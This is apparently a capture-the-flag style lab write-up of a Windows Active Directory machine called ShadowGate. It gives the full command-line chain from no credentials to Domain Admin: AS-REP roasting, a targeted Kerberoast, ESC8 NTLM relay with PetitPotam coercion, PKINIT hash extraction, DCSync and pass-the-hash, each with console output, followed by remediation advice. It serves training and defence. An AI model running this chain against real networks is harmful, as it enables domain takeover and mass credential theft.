`[AS-REP ROASTING]` `[BLOODHOUND]` `[GENERICWRITE]` `[TARGETED KERBEROASTING]` `[ADCS]` `[ESC8]` `[NTLM RELAY]` `[PKINIT]` `[DCSYNC]` `[PASS-THE-HASH]`

![](../.gitbook/assets/shadowgate_cover.png)

**Machine Write-Up**

---

**Platform:** Hack Smarter Labs  
**Difficulty:** Medium  
**Operating System:** Windows Server 2022 Build 20348

---

## Objective / Scope

ShadowGate simulates a post-acquisition internal penetration test against an Active Directory environment. The organisation recently absorbed a new network under tight operational deadlines, deferring security hardening. Starting with no credentials, the objective is to enumerate the domain and escalate from an unprivileged user to Domain Administrator via a chain of misconfigured AD object permissions and an abusable AD CS certificate template (ESC8).

---

<details>
<summary>Summary</summary>

Starting from zero credentials, rustscan reveals IIS running on the DC and an internal CA (`shadow-DC01-CA`) detected via SSL certificate issuers on LDAP ports — the ESC8 precondition is visible immediately. SMB null session enumeration yields 12 domain accounts. AS-REP roasting identifies `jtrueblood` as pre-auth disabled; the hash cracks offline via Hashcat. Authenticated BloodHound collection reveals `jtrueblood` holds `GenericWrite` over `bbrown`, enabling a targeted Kerberoast — a fake SPN is temporarily assigned, the TGS ticket is requested and cracked. With `bbrown` compromised, Certipy confirms ESC8: web enrollment is enabled over plain HTTP with no channel binding. `impacket-ntlmrelayx` is positioned to relay to `/certsrv/certfnsh.asp`; PetitPotam (authenticated, via `bbrown`) coerces DC01$ into authenticating to the listener. The relay delivers a DomainController certificate for DC01$. `certipy auth` uses PKINIT to exchange the certificate for DC01$'s NT hash. `secretsdump` DCSync extracts all domain credentials. Administrator access is confirmed via evil-winrm with Pass-the-Hash.

</details>

---

## Recon

### rustscan

```bash
rustscan -a <DC_IP> -- -sC -sV -Pn
```

```
# Console Output
PORT      STATE    SERVICE           REASON          VERSION
53/tcp    open     domain            Simple DNS Plus
80/tcp    open     tcpwrapped        syn-ack ttl 126
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server

88/tcp    open     kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-09 13:43:12Z)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

135/tcp   filtered msrpc             no-response
139/tcp   open     netbios-ssn?      syn-ack ttl 126
389/tcp   open     tcpwrapped        syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow

445/tcp   open     microsoft-ds?     syn-ack ttl 126
636/tcp   open     tcpwrapped        syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
|_ssl-date: TLS randomness does not represent time

3269/tcp  open     globalcatLDAPssl? syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow

3389/tcp  open     ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-09T12:52:07+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Key findings:
- **Domain:** `shadow.gate`
- **Hostname:** `DC01.shadow.gate`
- **OS:** Windows Server 2022 (Build 20348)
- **Port 80:** IIS 10.0 — not installed on a DC by default, worth enumerating immediately
- **SSL issuer:** `shadow-DC01-CA` on ports 389, 636, 3269 — an internal CA is running directly on this DC

### Reading the Signals

**Port 80 — IIS on a DC:** Windows doesn't put IIS on a DC by default. Something was deliberately installed here. Enumerate it immediately.

**SSL issuer `shadow-DC01-CA` on ports 389, 636, and 3269:** Every LDAP and global catalogue port carries a cert issued by `shadow-DC01-CA`. The DC is its own CA — AD CS is running on this machine, not on a separate server.

**Together:** IIS on a CA-hosting DC is the ESC8 setup. The only open question is whether the web enrollment endpoint is exposed over HTTP rather than HTTPS — that's what enumerating port 80 answers.

---

## HTTP Enumeration (Port 80)

![IIS on DC01 — port 80 response](screenshots/nmap-iis-webfeatures.png)

### Dirsearch

```
# Console Output
301  /aspnet_client
401  /certsrv/
```

`/certsrv/` returns **401 Unauthorized** — this is the AD CS Web Enrollment interface, present only if the Web Enrollment role is installed. The 401 confirms NTLM authentication over plain HTTP, not HTTPS. NTLM over HTTP is relayable — HTTPS would enforce channel binding and block the relay. ESC8 precondition confirmed.

![AD CS web enrollment — /certsrv/ over HTTP](screenshots/adcs-certsrv-exposure.png)

---

## SMB Enumeration

### Null Session

```bash
nxc smb <DC_IP> -u "" -p ""
```

```
# Console Output
[+] shadow.gate\:
```

Null session permitted. Share access denied, guest account disabled, RID brute-force blocked.

![SMB null session test](screenshots/smb-null-session.png)

### User Enumeration

```bash
nxc smb <DC_IP> -u "" -p "" --users
```

```
# Console Output
Administrator
Guest
krbtgt
ATHENA
mbrownlee
bbrown
jtrueblood
jsmith
clocke
tclarke
jbradford
amoss
```

12 domain accounts enumerated via null session SAMR.

![SMB user enumeration — 12 accounts](screenshots/smb-user-enum.png)

---

## Foothold — AS-REP Roasting `jtrueblood`

AS-REP roasting targets accounts with **"Do not require Kerberos pre-authentication"** enabled — no password needed, only a valid username list. The KDC returns an encrypted blob without verifying the requester's identity first, which can be cracked offline.

```bash
nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast hashes.txt
```

```
# Console Output
LDAP  DC01  $krb5asrep$23$jtrueblood@SHADOW.GATE:caead45788330e72cd587bbe549cdd14$...
```

`jtrueblood` is AS-REP roastable. Crack offline:

```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

```
# Console Output
$krb5asrep$23$jtrueblood@SHADOW.GATE:...:<PASSWORD REDACTED>
```

**Credentials: `jtrueblood:<PASSWORD REDACTED>`**

![AS-REP Roast — jtrueblood hash cracked](screenshots/asreproast-jtrueblood.png)

### Verify

```bash
nxc smb dc01.shadow.gate -u jtrueblood -p '<PASSWORD REDACTED>' --shares
```

```
# Console Output
SMB  DC01  [+] SHADOW.GATE\jtrueblood (Authenticated)
SMB  DC01  ADMIN$      NO ACCESS
SMB  DC01  C$          NO ACCESS
SMB  DC01  CertEnroll  READ
SMB  DC01  IPC$        READ
SMB  DC01  NETLOGON    READ
SMB  DC01  SYSVOL      READ
```

`CertEnroll` share is readable — further confirmation of the CA.

---

## Lateral Movement — Targeted Kerberoast `bbrown`

### BloodHound Collection

```bash
nxc ldap dc01.shadow.gate -u jtrueblood -p '<PASSWORD REDACTED>' \
  --bloodhound -c All --dns-server <DC_IP>
```

```
# Console Output
Bloodhound data collection completed in 0M 30S
```

**Key finding — `jtrueblood` has `GenericWrite` over `bbrown`:**

GenericWrite allows writing arbitrary LDAP attributes — most usefully, `servicePrincipalName`. Setting an SPN on a target account makes it Kerberoastable, enabling a **targeted Kerberoast** without any elevated privilege.

![BloodHound — jtrueblood GenericWrite over bbrown](screenshots/bloodhound-genericwrite-bbrown.png)

### Targeted Kerberoast

**Why this works:** When a Kerberos SPN is registered on an account, the KDC issues a TGS ticket encrypted with the account's NT hash. The requester never touches the password — they ask the KDC for a ticket and crack it offline. `targetedKerberoast` automates the SPN write, ticket request, and cleanup in one shot.

```bash
python3 ~/Tools/targetKerberoast/targetedKerberoast.py \
  -u jtrueblood -p '<PASSWORD REDACTED>' -d shadow.gate \
  --dc-ip <DC_IP>
```

```
# Console Output
$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$7ce933b9424f27a6cc71efc047215b97$...
```

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
# Console Output
$krb5tgs$23$*bbrown$...<PASSWORD REDACTED>
```

**Credentials: `bbrown:<PASSWORD REDACTED>`**

### BloodHound — `bbrown` Membership

`bbrown` is a member of **Certificate Service DCOM Access** — confirms CA interaction rights, though ESC8 coercion only requires any valid domain account.

![BloodHound — bbrown in Certificate Service DCOM Access](screenshots/bloodhound-bbrown-dcom-group.png)

![BloodHound — DCOM group description](screenshots/bloodhound-dcom-description.png)

---

## Privilege Escalation — AD CS ESC8 via NTLM Relay

### Certipy — ESC8 Confirmed

```bash
certipy find -u bbrown@shadow.gate -p '<PASSWORD REDACTED>' -dc-ip <DC_IP>
```

```
# Console Output
Certificate Authorities: 1
  CA Name: shadow-DC01-CA
  DNS Name: DC01.shadow.gate
  Web Enrollment:
    HTTP: Enabled
    HTTPS: False
  Vulnerabilities:
    ESC8: Web Enrollment is enabled over HTTP
```

**ESC8 confirmed.** The web enrollment endpoint (`certfnsh.asp`) accepts NTLM over HTTP. Because HTTP carries no channel binding, NTLM relayed from any domain account lands authenticated at the CA. Relaying a DC machine account (DC01$) lets us request a DomainController certificate on its behalf — usable via PKINIT to retrieve DC01$'s NT hash, then DCSync the domain.

Attack chain:
1. Coerce DC01$ auth to our listener via MS-EFSRPC (PetitPotam)
2. Relay to `/certsrv/certfnsh.asp`
3. Receive DomainController certificate for DC01$
4. PKINIT → DC01$ NT hash
5. DCSync → all domain hashes

### Step 1 — Start the Relay Listener

```bash
sudo impacket-ntlmrelayx \
  -t http://<DC_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

### Step 2 — Coerce DC01$ Authentication

> The unauthenticated variant of PetitPotam (`EfsRpcOpenFileRaw`) is patched on this target — the authenticated path via `bbrown` is required.

```bash
python3 ~/Tools/PetitPotam/PetitPotam.py \
  -u 'bbrown' -p '<PASSWORD REDACTED>' -d shadow.gate \
  <VPN_IP> <DC_IP>
```

```
# Console Output
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

`EfsRpcEncryptFileSrv` is unpatched — coercion succeeded.

### Step 3 — Certificate Issued

```
# Console Output
[*] (SMB): Received connection from <DC_IP>, attacking target http://<DC_IP>
[*] http:///@<DC_IP> [1] -> Generating CSR...
[*] http:///@<DC_IP> [1] -> CSR generated!
[*] http:///@<DC_IP> [1] -> Getting certificate...
[*] http:///@<DC_IP> [1] -> GOT CERTIFICATE! ID 3
[*] http:///@<DC_IP> [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
[*] http:///@<DC_IP> [1] -> Certificate successfully written to file
```

### Step 4 — PKINIT: DC01$ NT Hash

```bash
certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
```

```
# Console Output
[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC01.shadow.gate'
[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
[*] Using principal: 'dc01$@shadow.gate'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
```

**Why this works:** PKINIT allows certificate-based Kerberos authentication. The KDC embeds the account's NT hash in the encrypted AS-REP to support legacy NTLM services — `certipy auth` decrypts the response using the certificate's private key and extracts the hash directly (PKINIT Unpac-the-Hash).

### Step 5 — DCSync

```bash
impacket-secretsdump -just-dc-ntlm \
  shadow.gate/'DC01$'@<DC_IP> \
  -hashes 'aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>'
```

```
# Console Output
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\ATHENA:1103:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\mbrownlee:1104:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\bbrown:1109:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\jtrueblood:1110:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\jsmith:1112:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\clocke:1113:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\tclarke:1114:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\jbradford:1115:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
shadow.gate\amoss:1116:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>:::
```

All domain credentials dumped.

### Step 6 — Admin Shell

```bash
nxc winrm dc01.shadow.gate \
  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
```

```
# Console Output
WINRM  DC01  [+] shadow.gate\Administrator (Pwn3d!)
```

```bash
evil-winrm -i <DC_IP> -u Administrator \
  -H aad3b435b51404eeaad3b435b51404ee:<HASH REDACTED>
```

```
# Console Output
Evil-WinRM shell v3.9
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
shadow\administrator
```

**Root flag:** `krbtgt NT hash: <HASH REDACTED>`

---

## Remediation

- **Disable pre-authentication exemptions:** Remove the "Do not require Kerberos pre-authentication" flag from `jtrueblood` and audit all accounts. AS-REP roasting requires no credentials — one misconfigured account is sufficient for initial access.
- **Audit GenericWrite and dangerous ACLs:** `jtrueblood` holding GenericWrite over `bbrown` enabled targeted Kerberoasting with no elevated privilege. Run BloodHound regularly and remove unnecessary ACEs from standard user accounts.
- **Enforce HTTPS on web enrollment:** ESC8 requires NTLM over plain HTTP. Enabling HTTPS with Extended Protection for Authentication (EPA) enforces channel binding, making NTLM relay to `/certsrv/` impossible.
- **Move AD CS to a dedicated server:** Running the CA on the DC collapses the security boundary. A compromised CA host equals a compromised domain.
- **Patch MS-EFSRPC coercion:** Apply KB5005413 and consider disabling the EFS service on DCs that don't require it to eliminate the authenticated coercion path.
- **Enable SMB signing domain-wide:** Prevents relay attacks from leveraging coerced SMB authentication.
